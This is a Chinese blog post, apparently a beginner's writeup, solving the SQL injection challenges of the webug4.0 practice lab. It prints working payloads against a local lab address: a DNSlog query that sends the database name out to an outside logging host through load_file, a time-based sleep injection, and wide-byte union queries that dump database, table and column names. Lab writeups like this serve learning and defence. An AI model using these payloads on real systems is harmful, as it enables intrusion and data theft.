@@ -1,0 +1,147 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="/images/icons/favicon-16x16.png?v=2.5.0" type="image/png" sizes="16x16"><link rel="icon" href="/images/icons/favicon-32x32.png?v=2.5.0" type="image/png" sizes="32x32"><meta name="google-site-verification" content="QDXQenTtxQ6MwW-M_7k9lw39Kq7F4pwFO0u1QAPYlDE"><meta name="description" content="webug4.0是今年2月份刚更新的一个靶场，全网的wp比较少，我希望能以此来写一份wp，作为大家的参考，同时也让在web安全刚入门的我能有一些能力上的提升。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="webug4.0靶场writeup">
+<meta property="og:url" content="http://www.7ten7.top/2019/03/06/webug4.0wp/index.html">
+<meta property="og:site_name" content="7TEN7&#39;s Blog">
+<meta property="og:description" content="webug4.0是今年2月份刚更新的一个靶场，全网的wp比较少，我希望能以此来写一份wp，作为大家的参考，同时也让在web安全刚入门的我能有一些能力上的提升。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://i.imgur.com/BfwkWND.png">
+<meta property="og:image" content="https://i.imgur.com/6GuwFRH.png">
+<meta property="og:image" content="https://i.imgur.com/jWoV5kO.png">
+<meta property="og:image" content="https://i.imgur.com/zGNRZAE.png">
+<meta property="article:published_time" content="2019-03-05T16:00:00.000Z">
+<meta property="article:modified_time" content="2019-03-12T14:42:21.561Z">
+<meta property="article:author" content="7TEN7">
+<meta property="article:tag" content="writeup">
+<meta property="article:tag" content="靶场">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.imgur.com/BfwkWND.png"><title>webug4.0靶场writeup | 7TEN7's Blog</title><link ref="canonical" href="http://www.7ten7.top/2019/03/06/webug4.0wp/"><link rel="alternate" href="/atom.xml" type="application/atom+xml"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.5.0"><script src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js" data-ad-client="ca-pub-4793862971469188" async=""></script><script>var Stun = window.Stun || {};
+var CONFIG = {
+  root: '/',
+  algolia: undefined,
+  assistSearch: undefined,
+  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
+  sidebar: {"offsetTop":"20px","tocMaxDepth":6},
+  header: {"enable":true,"showOnPost":false,"scrollDownIcon":true},
+  postWidget: {"endText":true},
+  nightMode: {"enable":true},
+  back2top: {"enable":true},
+  codeblock: {"style":"simple","highlight":"ocean","wordWrap":false},
+  reward: false,
+  fancybox: false,
+  zoomImage: {"gapAside":"20px"},
+  galleryWaterfall: undefined,
+  lazyload: true,
+  pjax: undefined,
+  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
+  shortcuts: undefined,
+  prompt: {"copyButton":"复制","copySuccess":"复制成功","copyError":"复制失败"},
+  sourcePath: {"js":"js","css":"css","images":"images"},
+};
+
+window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 4.2.1"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner header-inner--height header-inner--bgcolor"><nav class="header-nav header-nav--sticky"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">首页</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">归档</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/tags/"><span class="header-nav-menu-item__icon"><i class="fas fa-tags"></i></span><span class="header-nav-menu-item__text">标签</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/friends/"><span class="header-nav-menu-item__icon"><i class="fas fa-link"></i></span><span class="header-nav-menu-item__text">友链</span></a></div></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">webug4.0靶场writeup</h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2019-03-06</span></span><span class="post-meta-item post-meta-item--wordcount"><span class="post-meta-item__icon"><i class="far fa-file-word"></i></span><span class="post-meta-item__info">字数统计</span><span class="post-meta-item__value">1.1k</span></span><span class="post-meta-item post-meta-item--readtime"><span class="post-meta-item__icon"><i class="far fa-clock"></i></span><span class="post-meta-item__info">阅读时长</span><span class="post-meta-item__value">6分</span></span></div></header><div class="post-body"><blockquote>
+<p>webug4.0是今年2月份刚更新的一个靶场，全网的wp比较少，我希望能以此来写一份wp，作为大家的参考，同时也让在web安全刚入门的我能有一些能力上的提升。<a id="more"></a></p>
+</blockquote>
+<blockquote>
+<p>虚拟机版的靶场下过来后打开 phpstudy 中选择的 php版本可能为 5.2 这会导致问题sql注入第一题不会报错，切换到 php5.4 版本即可正常 </p>
+</blockquote>
+
+        <h1 id="sql注入"   >
+          <a href="#sql注入" class="heading-link"><i class="fas fa-link"></i></a>sql注入</h1>
+      
+        <h2 id="1-显错注入"   >
+          <a href="#1-显错注入" class="heading-link"><i class="fas fa-link"></i></a>1.显错注入</h2>
+      <p>本题是很常规的注入，注入点是id，单引号闭合</p>
+
+        <h2 id="2-布尔注入"   >
+          <a href="#2-布尔注入" class="heading-link"><i class="fas fa-link"></i></a>2.布尔注入</h2>
+      <blockquote>
+<p>DNSlog平台 <span class="exturl"><a class="exturl__link"   href="http://dnsbin.zhack.ca/#master=5df7f3d5b2bda429cc8d"  target="_blank" rel="noopener">http://dnsbin.zhack.ca/#master=5df7f3d5b2bda429cc8d</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 免注册</p>
+</blockquote>
+<p>看到题目的盲注，就想到试下之前看到的 DNSlog 因为都没接触过类似的解法。但是尝试了下，发现并没有返回数据。然后把到 mysql 中执行测试 load_file 函数，但是返回的是NULL，感觉可能是没有文件读写权限….好吧 看来这题不能用 DNSlog 了，但是为了测试下 DNSlog的效果，我去查了如何设置文件读写权限，得到以下内容。</p>
+<blockquote>
+<p>mysql新版本下具有secure-file-priv参数，用来限制LOAD DATA, SELECT … OUTFILE, LOAD_FILE()传到哪个指定目录。</p>
+<ul>
+<li>ure_file_priv的值为null ，表示限制mysqld 不允许导入|导出</li>
+<li>当secure_file_priv的值为/tmp/ ，表示限制mysqld 的导入|导出只能发生在/tmp/目录下</li>
+<li>当secure_file_priv的值没有具体值时，表示不对mysqld 的导入|导出做限制<br>如何更改secure-file-priv参数的值：<br>修改my.ini 文件，在[mysqld] 下加入secure_file_priv=，保存并重启mysql。<br>当然在实际渗透测试时，我们是无法修改这里的参数值得，这里仅作为学习时的参考。</li>
+</ul>
+</blockquote>
+<p>最终在mysql的配置文件中加入了 secure_file_priv= 然后再测试 load_file 函数，成功读取到文件内容。</p>
+<p>然后再测试 DNSlog<br>playload如下：<span class="exturl"><a class="exturl__link"   href="http://192.168.65.138/control/sqlinject/bool_injection.php?id=2&#39;"  target="_blank" rel="noopener">http://192.168.65.138/control/sqlinject/bool_injection.php?id=2&#39;</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> and if((select load_file(concat(‘\\\\‘,(select database()),’.409241b53f1692ceddeb.d.zhack.ca\abc’))),1,1)–+</p>
+<p>成功回显了数据库名<br>
+        <img   class="lazyload lazyload-gif"
+          src="/images/loading.svg" data-src="https://i.imgur.com/BfwkWND.png"  alt="">
+      </p>
+<p>这题同样没有什么过滤内容，单引号闭合，常规注入就行，手注和或者上脚本都可以，这里就不做演示了。</p>
+<p>DNSlog有一点需要注意的就是对长度的限制，所以要使用 limit 来单个读取</p>
+
+        <h2 id="3-延时注入"   >
+          <a href="#3-延时注入" class="heading-link"><i class="fas fa-link"></i></a>3.延时注入</h2>
+      <p>时间盲注，和第二题大致相同</p>
+
+        <h2 id="4-POST注入"   >
+          <a href="#4-POST注入" class="heading-link"><i class="fas fa-link"></i></a>4.POST注入</h2>
+      <p>这题的话有一个搜索框，同样是无过滤的单引号闭合，用 bp 抓到更改 post 数据来注入，但是这题我没有找到回显位，之后我也尝试了报错注入，布尔盲注，时间盲注，但是，得到的结果都是，如果sql语句是正确的，就正常显示。如果sql语句是错误的，就显示错误的sql语句。<br>
+        <img   class="lazyload lazyload-gif"
+          src="/images/loading.svg" data-src="https://i.imgur.com/6GuwFRH.png"  alt="">
+      </p>
+<blockquote>
+<p>所以感觉这题就两个逻辑，sql语句正确，正常显示页面，sql语句错误，显示错误的sql语句….好吧，不知道这么解了，应该是我菜…</p>
+</blockquote>
+<p>真的想不到为什么…看一眼题目源码，发现源码中有提示：</p>
+<pre><code>SELECT * FROM sqlinjection WHERE content = &apos;1&apos; or if(1=1, sleep(3),1); --+
+</code></pre><p>好吧 这题这题是要时间盲注，测试了一下，发现我之前的问题出在了连接关键词用了 and ，这里连接词一定要用 or ，不太明白为什么。。那么既然是盲注，直接上脚本就可以了，就不手注演示了。<br>
+        <img   class="lazyload lazyload-gif"
+          src="/images/loading.svg" data-src="https://i.imgur.com/jWoV5kO.png"  alt="">
+      </p>
+
+        <h2 id="5-过滤注入"   >
+          <a href="#5-过滤注入" class="heading-link"><i class="fas fa-link"></i></a>5.过滤注入</h2>
+      <p>看这题，界面跟上一题post注入一样，就同样测试了下时间盲注，发现并没有遇到过滤。这让我百思不得其解，没有过滤为什么叫过滤注入…看一手源码，看到这源码的过滤，我真水醉了…这也能叫过滤吗…<br>
+        <img   class="lazyload lazyload-gif"
+          src="/images/loading.svg" data-src="https://i.imgur.com/zGNRZAE.png"  alt="">
+      </p>
+
+        <h2 id="6-宽字节注入"   >
+          <a href="#6-宽字节注入" class="heading-link"><i class="fas fa-link"></i></a>6.宽字节注入</h2>
+      <p>没有任何过滤，宽字节注入，playload如下：</p>
+<pre><code>http://192.168.65.138/control/sqlinject/width_byte_injection.php?id=0%df&apos; union select 1,(select database())--+ 爆库
+http://192.168.65.138/control/sqlinject/width_byte_injection.php?id=0%df&apos; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database())--+  爆表
+http://192.168.65.138/control/sqlinject/width_byte_injection.php?id=0%df&apos; union select 1,(select group_concat(column_name) from information_schema.columns where table_name=0x73716c696e6a656374696f6e)--+ 爆字段
+</code></pre></div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ 本文结束，感谢您的阅读 ------</div></div><div class="post-copyright copyright"><div class="copyright-author"><span class="copyright-author__name">本文作者: </span><span class="copyright-author__value"><a href="http://www.7ten7.top">7TEN7</a></span></div><div class="copyright-link"><span class="copyright-link__name">本文链接: </span><span class="copyright-link__value"><a href="http://www.7ten7.top/2019/03/06/webug4.0wp/">http://www.7ten7.top/2019/03/06/webug4.0wp/</a></span></div><div class="copyright-notice"><span class="copyright-notice__name">版权声明: </span><span class="copyright-notice__value">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" rel="external nofollow" target="_blank">BY-NC-SA</a> 许可协议。转载请注明出处！</span></div></div><div class="post-tags"><span class="post-tags-item"><span class="post-tags-item__icon"><i class="fas fa-tag"></i></span><a class="post-tags-item__link" href="http://www.7ten7.top/tags/writeup/">writeup</a></span><span class="post-tags-item"><span class="post-tags-item__icon"><i class="fas fa-tag"></i></span><a class="post-tags-item__link" href="http://www.7ten7.top/tags/%E9%9D%B6%E5%9C%BA/">靶场</a></span></div><nav class="post-paginator paginator"><div class="paginator-prev"><a class="paginator-prev__link" href="/2019/03/08/%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84php%E7%88%AC%E5%8F%96%E5%9B%BE%E7%89%87/"><span class="paginator-prev__icon"><i class="fas fa-angle-left"></i></span><span class="paginator-prev__text">一次简单的php爬取图片</span></a></div><div class="paginator-next"><a class="paginator-next__link" href="/2019/03/02/TP5.1+PHPMailer%E5%AE%9E%E7%8E%B0%E9%82%AE%E4%BB%B6%E5%8F%91%E9%80%81%E5%8A%9F%E8%83%BD/"><span class="paginator-prev__text">TP5.1+PHPMailer实现邮件发送功能</span><span class="paginator-next__icon"><i class="fas fa-angle-right"></i></span></a></div></nav></footer></div></div><div class="comments" id="comments"><div id="valine-container"></div></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><div class="sidebar-nav"><span class="sidebar-nav-toc current">文章目录</span><span class="sidebar-nav-ov">站点概览</span></div><section class="sidebar-toc"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#sql注入"><span class="toc-number">1.</span> <span class="toc-text">
+          sql注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-显错注入"><span class="toc-number">1.1.</span> <span class="toc-text">
+          1.显错注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-布尔注入"><span class="toc-number">1.2.</span> <span class="toc-text">
+          2.布尔注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-延时注入"><span class="toc-number">1.3.</span> <span class="toc-text">
+          3.延时注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-POST注入"><span class="toc-number">1.4.</span> <span class="toc-text">
+          4.POST注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-过滤注入"><span class="toc-number">1.5.</span> <span class="toc-text">
+          5.过滤注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-宽字节注入"><span class="toc-number">1.6.</span> <span class="toc-text">
+          6.宽字节注入</span></a></li></ol></li></ol></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="/images/author/author.png" alt="avatar"></div><p class="sidebar-ov-author__text">7TEN7</p></div><div class="sidebar-ov-feed"><span class="sidebar-ov-feed-rss"><a class="sidebar-ov-feed-rss__link" href="/atom.xml" target="_blank" rel="noopener"><span class="sidebar-ov-feed-rss__icon"><i class="fas fa-rss"></i></span><span>RSS 订阅</span></a></span></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">55</div><div class="sidebar-ov-state-item__name">归档</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--tags" href="/tags/"><div class="sidebar-ov-state-item__count">32</div><div class="sidebar-ov-state-item__name">标签</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="知识共享许可协议" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">你已阅读了 </span><span class="sidebar-reading-info__num">0</span><span class="sidebar-reading-info__perc">%</span></div><div class="sidebar-reading-line"></div></div></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2021</span><span class="footer__devider"></span><span>7TEN7</span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script src="https://cdn.jsdelivr.net/npm/canvas-nest.js@1.0.1/dist/canvas-nest.min.js" color="255,255,255" opacity="1" count="200" zIndex="-1"></script><script src="https://cdn.jsdelivr.net/npm/lazyload@2.0.0-rc.2/lazyload.min.js"></script><script src="https://cdn.jsdelivr.net/npm/leancloud-storage@latest/dist/av-min.js"></script><script src="https://cdn.jsdelivr.net/npm/valine@latest/dist/Valine.min.js"></script><script>function loadValine () {
+  var GUEST_INFO = ['nick', 'mail', 'link'];
+  var guest_info = 'nick,mail,link';
+
+  guest_info = guest_info.split(',').filter(function(item) {
+    return GUEST_INFO.indexOf(item) > -1;
+  });
+  new Valine({
+    el: '#valine-container',
+    appId: 'Nzl7LsK4moQuOsIfeWfbc8Rz-gzGzoHsz',
+    appKey: '5xmoJuWrMWHpI7pwtJviyIh6',
+    notify: true,
+    verify: true,
+    placeholder: 'Just go go',
+    avatar: 'mp',
+    meta: guest_info,
+    pageSize: '10' || 10,
+    visitor: false,
+    recordIP: true,
+    lang: '' || 'zh-cn',
+    path: window.location.pathname
+  });
+}
+
+if (false) {
+  loadValine();
+} else {
+  window.addEventListener('DOMContentLoaded', loadValine, false);
+}</script><script src="/js/utils.js?v=2.5.0"></script><script src="/js/stun-boot.js?v=2.5.0"></script><script src="/js/scroll.js?v=2.5.0"></script><script src="/js/header.js?v=2.5.0"></script><script src="/js/sidebar.js?v=2.5.0"></script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/assets/shizuku.model.json"},"display":{"position":"right","width":260,"height":380,"vOffset":5},"mobile":{"show":true},"log":false});</script></body></html>
